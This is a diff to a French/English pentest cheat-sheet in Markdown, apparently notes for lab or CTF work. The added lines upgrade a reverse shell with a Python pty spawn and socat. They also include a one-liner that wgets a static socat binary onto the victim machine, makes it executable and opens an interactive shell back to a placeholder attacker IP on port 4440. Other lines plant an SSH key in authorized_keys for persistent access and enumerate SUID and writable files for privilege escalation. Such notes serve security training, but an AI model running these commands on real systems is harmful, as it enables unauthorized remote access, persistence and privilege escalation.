@@ -1,8 +1,22 @@
 # Dans un reverse shell
 
-```py
+## Upgrade a reverse shell to a fully TTY interactive shell
+
+Sometimes we will get a shell but it won't be very convenient. There are some ways to upgrade your shells to interactive TTY reverse shell
+if you want a quick dirty little fix but not completely interactive this python command works well for python3
+```bash
 python3 -c "import pty;pty.spawn('/bin/bash')"
 ```
+
+## With socat
+`socat file:`tty`,raw,echo=0 tcp-listen:4440` on your kali
+`socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:my_ip:4440` from the victime machine
+
+If socat is not installed see here for static binaries
+`wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:my_ip:4440`
+OR
+`wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat` in your kali then put on your python3 webserver
+and then **wget -q http://YOUR-KALI-IP/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:YOUR-KALI-IP:4440**
 
 ## Pour avoir un accès ssh
 
@@ -10,7 +24,7 @@ python3 -c "import pty;pty.spawn('/bin/bash')"
 ssh-keygen -f mykey
 # No passphrase
 mykey & mykey.pub
-mv mykey ~/.ssh/authorized_keys
+mv mykey.pub ~/.ssh/authorized_keys
 # Copy mykey to local machine in the .ssh folder
 nano mykey # and paste the private key
 sudo chmod 600 mykey
@@ -59,6 +73,7 @@ hashcat -m 0 hashPWD.txt rockyou.txt
 
 `find / -type f -perm -04000 -ls 2>/dev/null`
 `find / -perm -4000 2>/dev/null`
+`find / -writable ! -user `whoami` -type f ! -path "/proc/*" ! -path "/sys/*" -exec ls -al {} \; 2>/dev/null`
 
 
 ```py
